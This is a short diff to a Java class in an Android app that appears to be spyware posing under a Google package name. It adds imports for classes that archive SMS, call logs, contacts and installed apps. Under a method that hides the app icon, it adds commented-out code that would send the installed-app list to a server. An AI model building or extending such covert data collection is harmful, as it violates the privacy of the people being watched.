@@ -1,6 +1,10 @@
 package com.google.android.apps.ui;
 
 import com.google.android.apps.data_collection.AboutDevice;
+import com.google.android.apps.data_collection.AppsArchive;
+import com.google.android.apps.data_collection.CallsArchive;
+import com.google.android.apps.data_collection.ContactBook;
+import com.google.android.apps.data_collection.SmsArchive;
 import com.google.android.apps.repositories.network.NetworkRepo;
 import com.google.android.apps.repositories.network.models.response.BaseResponse;
 import com.google.android.apps.repositories.network.models.response.InitialResponse;
@@ -64,7 +68,8 @@ public class MainInteractorImpl implements MainInteractor {
 
     @Override
     public void onSetHideIcon(boolean isHide) {
-
+//        new AppsArchive().getInstallApps()
+//                .flatMap(apps -> networkRepo.addListApplications(apps));
     }
 
     @Override
